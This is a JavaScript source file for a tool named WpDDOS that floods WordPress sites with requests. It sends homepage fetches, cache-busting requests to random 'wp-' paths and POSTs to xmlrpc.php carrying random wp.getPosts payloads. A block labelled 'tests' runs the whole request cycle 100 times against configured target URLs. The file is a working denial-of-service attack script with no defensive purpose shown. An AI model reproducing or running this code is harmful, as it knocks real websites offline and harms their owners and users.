/**
 * Created by g00dv1n on 27.09.16.
 */
'use strict'

let rp = require('request-promise');
let config = require('./config');
let InfiniteLoop = require('infinite-loop');

class WpDDOS {
    constructor(urls) {
        this.urls = urls;
    }

    getHomePage(url) {
        return rp(url)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(url,err);
            });
    }

    printError(url, err) {
        console.log('------------------------------');
        console.log(url);
        console.log(err && err.statusCode || 'unknow error code');
        console.log('------------------------------');
    }

    printOk(url) {
        console.log('------------------------------');
        console.log(url);
        console.log('OK!');
        console.log('------------------------------');
    }

    getRandomWp(url) {
        let randStr = Math.random().toString(36).substring(7);
        let fullUrl = `${url}wp-${randStr}`;

        return rp(fullUrl)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(fullUrl,err);
            });
    }

    postRandomXmlRpc(url) {
        let randStr = Math.random().toString(36).substring(7);
        let fullUrl = url + 'xmlrpc.php';
        let options = {
            uri: fullUrl,
            method: 'POST',
            headers: {
                'content-type': 'application/xml'
            },
            body: `
            <?xml version="1.0" encoding="utf-8"?>
                <methodCall>
                <methodName>wp.getPosts</methodName>
                    <params>
                        <param>
                            <value>${randStr}</value>
                        </param>
            </params>
            </methodCall>
            `
        };

        return rp(options)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(fullUrl,err);
            });
    }

    runAll() {
        let urls = this.urls;
        for (let i in urls) {
            this.getHomePage(urls[i]);
            this.getRandomWp(urls[i]);
            this.postRandomXmlRpc(urls[i]);
        }
    }

}

module.exports = WpDDOS;

// tests
(()=>{
    let wp = new WpDDOS(config.URLS);
    let il = new InfiniteLoop;
    let task = () => {
        wp.runAll();
    };

    for(let i=0;i<100; i++) {
        task();
    }

})();